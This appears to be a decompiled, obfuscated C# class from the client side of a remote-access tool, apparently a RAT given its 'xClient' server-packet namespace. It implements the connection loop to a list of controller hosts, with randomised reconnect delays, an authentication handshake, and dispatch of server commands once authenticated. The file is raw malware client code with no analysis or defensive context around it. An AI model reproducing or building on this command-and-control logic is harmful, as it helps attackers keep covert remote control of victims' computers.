using System;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.NetSerializer;
using xClient.Core.Packets.ServerPackets;

public class GClass34 : GClass33
{
	[CompilerGenerated]
	private static bool bool_6;

	[CompilerGenerated]
	private bool bool_7;

	private readonly GClass7 gclass7_0;

	public static bool Exiting
	{
		[CompilerGenerated]
		get
		{
			return bool_6;
		}
		[CompilerGenerated]
		private set
		{
			bool_6 = value;
		}
	}

	public bool Authenticated
	{
		[CompilerGenerated]
		get
		{
			return bool_7;
		}
		[CompilerGenerated]
		private set
		{
			bool_7 = value;
		}
	}

	public GClass34(GClass7 hostsManager)
	{
		gclass7_0 = hostsManager;
		base.Serializer = new Serializer(GClass26.smethod_0());
		base.Event_1 += method_19;
		base.Event_2 += method_17;
		base.Event_0 += method_18;
	}

	public void method_16()
	{
		while (true)
		{
			if (!Exiting)
			{
				if (!base.Connected)
				{
					Thread.Sleep(100 + new Random().Next(0, 250));
					GClass55 gClass = gclass7_0.method_0();
					method_4(gClass.IpAddress, gClass.Port);
					Thread.Sleep(200);
					Application.DoEvents();
				}
				while (base.Connected)
				{
					Application.DoEvents();
					Thread.Sleep(2500);
				}
				if (Exiting)
				{
					break;
				}
				Thread.Sleep(GClass0.int_0 + new Random().Next(250, 750));
				continue;
			}
			return;
		}
		method_12();
	}

	private void method_17(GClass33 client, GInterface4 packet)
	{
		Type type = packet.GetType();
		if (!Authenticated)
		{
			if (type == typeof(GetAuthentication))
			{
				GClass57.smethod_15((GetAuthentication)packet, client);
			}
			else if (type == typeof(SetAuthenticationSuccess))
			{
				Authenticated = true;
			}
		}
		else
		{
			GClass27.smethod_0(client, packet);
		}
	}

	private void method_18(GClass33 client, Exception ex)
	{
		client.method_12();
	}

	private void method_19(GClass33 client, bool connected)
	{
		Authenticated = false;
		if (!connected && !Exiting)
		{
			method_20();
		}
	}

	private void method_20()
	{
		GClass57.smethod_45();
	}

	public void method_21()
	{
		Exiting = true;
		method_12();
	}
}
